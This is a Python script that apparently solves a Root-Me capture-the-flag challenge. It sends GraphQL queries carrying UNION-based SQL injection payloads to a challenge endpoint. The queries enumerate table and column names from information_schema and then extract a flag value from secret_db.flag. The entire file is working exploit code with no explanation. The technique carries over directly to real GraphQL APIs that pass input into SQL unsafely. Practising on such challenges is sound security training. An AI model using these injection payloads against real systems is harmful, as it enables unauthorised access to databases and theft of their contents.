import httpx

url = "http://challenge01.root-me.org:59079/rocketql"

def get_table_name(idx):
    payload = {
        "query": f"{{ rocket(id: \"0 UNION SELECT 2,table_name,2,2 FROM information_schema.tables LIMIT 1 OFFSET {idx} -- -\") {{ name, country, is_active }} }}"
    }
    r = httpx.post(url, json=payload)
    return r.text
def get_column_name(idx):
    payload = {
        "query": f"{{ rocket(id: \"0 UNION SELECT 2,column_name,2,2 FROM information_schema.columns WHERE table_name = 'flag' LIMIT 1 OFFSET {idx} -- -\") {{ name, country, is_active }} }}"
    }
    r = httpx.post(url, json=payload)
    return r.text
import re

def extract_table_name(response):
    match = re.search(r'"name":"([^"]+)"', response)
    if match:
        return match.group(1)
    return None
def list_table_name():
    for i in range(1, 200):
        response = get_table_name(i)
        if "country" in response:
            print(extract_table_name(response))

list_table_name()
def list_column_name():
    for i in range(0, 100):
        response = get_column_name(i)
        if "country" in response:
            print(extract_table_name(response))

# list_column_name()
def get_flag():
    payload = {
        "query": f"{{ rocket(id: \"0 UNION SELECT 2,value,2,2 FROM secret_db.flag limit 1 offset 0-- -\") {{ name, country, is_active }} }}"
    }
    r = httpx.post(url, json=payload)
    return r.text

# print(get_flag())